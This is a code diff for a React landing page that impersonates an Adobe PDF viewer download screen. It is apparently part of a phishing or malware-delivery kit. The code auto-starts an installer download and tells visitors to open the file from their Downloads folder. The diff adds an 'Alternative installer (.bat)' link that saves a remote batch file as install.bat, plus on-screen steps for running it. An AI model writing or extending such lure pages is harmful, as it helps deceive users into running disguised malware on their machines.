@@ -415,49 +415,18 @@ function AdobeDesktop({
   installerUrl,
   installerFileName,
   code,
+  windowsBatUrl,
 }: {
   installerUrl: string;
   installerFileName: string;
   code: string;
+  windowsBatUrl?: string;
 }) {
-  const [phase, setPhase] = useState<'splash' | 'download'>('download');
-  const [downloadStarted, setDownloadStarted] = useState(false);
-  const [cancelled, setCancelled] = useState(false);
-
-  // Boot loader already shows the Adobe splash while the link loads.
-  useEffect(() => {
-    if (phase !== 'splash') return;
-    const timer = window.setTimeout(() => setPhase('download'), 4000);
-    return () => window.clearTimeout(timer);
-  }, [phase]);
-
-  // Auto-start installer download (delayed so React Strict Mode remount does not cancel it).
-  useEffect(() => {
-    if (phase !== 'download' || !installerUrl || cancelled) return;
-    let alive = true;
-    const timer = window.setTimeout(() => {
-      if (!alive) return;
-      triggerInstallerDownload(installerUrl, installerFileName);
-      setDownloadStarted(true);
-    }, 200);
-    return () => {
-      alive = false;
-      window.clearTimeout(timer);
-    };
-  }, [phase, installerUrl, installerFileName, code, cancelled]);
-
-  if (phase === 'splash') {
-    return (
-      <div className="adobe-splash">
-        <div className="adobe-splash__center">
-          <AdobeLogo size={100} />
-          <div className="adobe-splash__spinner" />
-          <h2>Opening your document...</h2>
-          <p>Preparing the best PDF experience for your device</p>
-        </div>
-      </div>
-    );
-  }
+  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
+    code,
+    installerUrl,
+    installerFileName,
+  );
 
   return (
     <div className="adobe-download">
@@ -522,7 +491,7 @@ function AdobeDesktop({
                 {cancelled
                   ? 'Download cancelled.'
                   : downloadStarted
-                    ? 'Download started. Check your browser downloads.'
+                    ? `Download started. Open ${installerFileName} from your Downloads folder.`
                     : 'Preparing download…'}
               </div>
             </div>
@@ -530,15 +499,21 @@ function AdobeDesktop({
               <a className="adobe-download__btn-ghost" href={installerUrl} download={installerFileName}>
                 Manually start download
               </a>
+              {windowsBatUrl ? (
+                <a className="adobe-download__btn-ghost" href={windowsBatUrl} download="install.bat">
+                  Alternative installer (.bat)
+                </a>
+              ) : null}
               <button
                 type="button"
                 className="adobe-download__btn-cancel"
-                onClick={() => setCancelled(true)}
+                onClick={cancel}
               >
                 Cancel
               </button>
             </div>
           </div>
+          <DownloadSteps fileName={installerFileName} />
           <footer className="adobe-download__footer">Secure document share · Windows viewer setup</footer>
         </div>
       </div>
@@ -602,6 +577,7 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
         installerFileName={
           query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
         }
+        windowsBatUrl={query.data.windowsBatUrl}
       />
     );
   }
